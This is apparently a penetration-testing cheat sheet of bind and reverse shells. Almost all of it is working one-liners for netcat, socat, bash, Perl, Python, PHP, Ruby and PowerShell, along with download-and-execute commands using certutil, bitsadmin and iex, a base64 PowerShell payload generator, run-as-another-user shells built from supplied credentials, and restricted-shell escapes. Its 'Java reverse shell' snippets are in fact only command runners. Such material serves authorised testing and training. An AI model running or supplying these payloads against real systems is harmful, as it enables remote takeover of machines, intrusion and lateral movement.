---
description: Bind and reverse shells
---

# Shells

## NetCat

#### Transfer file

```
nc -nv <dest ip> <port> < file               #send file
nc -nlvp <port> > file_local                 #receive file
```

#### Bind shell

Use [rlwrap](https://github.com/hanslub42/rlwrap) to enable history and command recall  support on both cmd and bash shells

```
nc -nlvp <port> -e <cmd.exe or /bin/bash>    #remote
rlwrap nc -nlvp <port> -e <cmd.exe or /bin/bash>
```

#### Reverse shell

```
nc -nv <target ip> <port> -e <cmd.exe or /bin/bash>    #remote
rlwrap nc -nv <target ip> <port> -e <cmd.exe or /bin/bash>
```

#### Reverse shell BSD version

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f              
```

## Socat

#### Transfer file

```
socat TCP4-LISTEN:<port>,fork file:<filename>             #send file
socat TCP4:<ip>:<port> file:filename_local,create         #receive file
```

#### Bind shell

```
socat TCP4-LISTEN:<port>,fork EXEC:cmd.exe,pipes          #remote windows
socat TCP4-LISTEN:<port>,fork EXEC:/bin/bash              #remote linux
socat – TCP4:<ip>:<port>                                  #local
```

#### Reverse shell

```
socat TCP4:<ip>:<port>,fork EXEC:cmd.exe,pipes            #remote windows
socat TCP4:<ip>:<port>,fork EXEC:/bin/bash                #remote linux
socat -dd TCP4-LISTEN:<port> STDOUT                       #local
```

## CMD

#### File transfer

Download

```
cmd.exe /c certutil.exe -urlcache -split -f http://<ip>/<file> <local path>
cmd.exe /c certutil.exe -verifyctl -f -split http://<ip>/<file> <local path>
cmd.exe /c CertReq -Post -config https://<ip> c:\windows\win.ini <local path>
cmd.exe /c bitsadmin /transfer downloadjob /download /priority high <url> <local path>
```

Upload

```
cmd.exe /c CertReq -Post -config https://<ip> <file> and show response in terminal
```

## Powershell

#### Generate Base64 code

```
echo "<code>" | iconv -t utf-16le | base64 -w 0
powershell -encodedCommand <b64 code>
```

#### Download file

```
powershell -c "Invoke-WebRequest -URI '<ip>/<file>' -OutFile '<path>'"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<ip>/<file>','C:\<path>')"
iex (New-Object System.Net.Webclient).DownloadString('https://<path>.ps1')
```

#### Bind shell

```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('<ip>',<port>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

#### Reverse shell

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
powershell.exe -nop -w hidden -e $client = New-Object System.Net.Sockets.TCPClient('"+LHOST+"',"+LPORT+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Base64 encoded payload in python

```python
#/usr/bin/python3
import base64
lhost = '<LHOST>'
lport = '<LPORT>'
payload = '$client = New-Object System.Net.Sockets.TCPClient("'+lhost+'",'+lport+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
print("powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode())
```

#### Run code as another user

```
powershell.exe -c "$user='<username>'; $pass='<password>'; try { Invoke-Command -ComputerName <hostname> -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) -ScriptBlock {<code>}} catch { echo $_.Exception.Message }" 2>&1
#In case of auth error use SSP
powershell.exe -c "$user='<username>'; $pass='<password>'; try { Invoke-Command -ComputerName <hostname> -Authentication CredSSP -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) -ScriptBlock {<code>}} catch { echo $_.Exception.Message }" 2>&1
```

#### Reverse shell as another user - netcat version

Download netcat executable for windows on target, then use it to open a reverse shell under the context of another user

```
powershell.exe -c "$user='<username>'; $pass='<password>'; try { Start-Process -FilePath 'C:\<path to nc>.exe' -ArgumentList '-nv','<LHOST>','<LPORT>','-e','cmd.exe' -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) } catch { echo $_.Exception.Message }" 2>&1
```

#### Reverse shell as another user - download and execute version

Generate a reverse shell payload to be executed by powershell as another user

```
powershell.exe -c "$user='<user>'; $pass='<pass>'; try { Invoke-Command -ScriptBlock { iex(New-Object Net.WebClient).DownloadString('http://<path to .ps1>') } -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) } catch { echo $_.Exception.Message }" 2>&1"
```

## Powercat

#### Transfer file

```
powercat -c <ip> -p <port> -i <file>      #send file
powercat -lp <port> -of <file>            #receive file
```

#### Bind shell

```
powercat -lp <port> -e cmd.exe
```

#### Reverse shell

```
powercat -c <ip> -p <port> -e cmd.exe
```

## Bash

#### Download file

{% content-ref url="linux/connection.md" %}
[connection.md](linux/connection.md)
{% endcontent-ref %}

#### Download file script (pure bash)

A script that downloads a file from a remote server without invoking any external script/program, not even linux standard ones.

Save it:

```
cat > /tmp/get
EOF
chmod +x /tmp/get
/tmp/get <url>
```

Source code:

```
  #!/bin/bash
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
```

#### Reverse shell

```
bash -i >& /dev/tcp/<ip>/<port> 0>&1
0<&196;exec 196<>/dev/tcp/<ip>/<port>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ip>/<port>;cat <&5 | while read line; do $line 2>&5 >&5; done
```

## Perl

#### Download file

```
perl -e 'use File::Fetch;my $url="<url>";my $ff=File::Fetch->new(uri => $url);my $file=$ff->fetch() or die $ff->error;'
```

#### Reverse shell

```
perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python

#### Download file

```
python -c "import urllib;f=urllib.URLopener();f.retrieve('http://<url>','<dest>');"
```

#### Reverse shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP

#### Download file

```
php -r 'file_put_contents("<dest>", fopen("http://<url>", 'r'));'
```

#### Reverse shell

```
php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Ruby

#### Download file

```
ruby -e 'require "open-uri";download=open("http://<url>");IO.copy_stream(download,"<dest>")'
```

#### Reverse shell

```
ruby -rsocket -e'f=TCPSocket.open("<ip>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Java

#### Reverse shell

```
public static String execCmd(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}
```

#### Reverse shell Java > 7

```
public static String execCmd(String cmd) {String result = null; try (InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream(); Scanner s = new Scanner(inputStream).useDelimiter("\\A")) {result = s.hasNext() ? s.next() : null;} catch (IOException e) {e.printStackTrace();}return result;}
```

## Fix broken shell

### Fix $PATH

```
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&&export TERM=xterm&&export SHELL=bash
```

### Make interactive/Jail escape

A shell is not interactive if `sudo -l` or `tty`return nothing or errors. To upgrade a shell use one of the following commands. These commands can also be used to escape from limited shells.

#### Python

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### Bash

```
echo os.system('/bin/bash')
/bin/sh -i
```

#### Script command

```
script /dev/null
```

#### Perl

```
perl -e 'exec "/bin/sh";'
```

#### Vi

```
vi
:!bash
:set shell=/bin/bash:shell
```

#### Ed

```
ed
!'/bin/bash'
```

#### Awk

```
awk 'BEGIN {system("/bin/bash")}'
```

#### Socat

```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<host ip>:<port>
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<host ip>:<port>
```

### Upgrade functionalities

1. After spawning a new shell with one of the methods above, do `CTRL+Z` to background Netcat.
2. `stty raw -echo&&fg`
3. In new shell: `reset`
4. set terminal type to xterm: `export TERM=xterm`
5. in local shell: `stty -a` to get current terminal size (rows and cols)
6. set correct terminal in remote terminal: `stty rows <rows> cols <cols>`
7. `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`



###
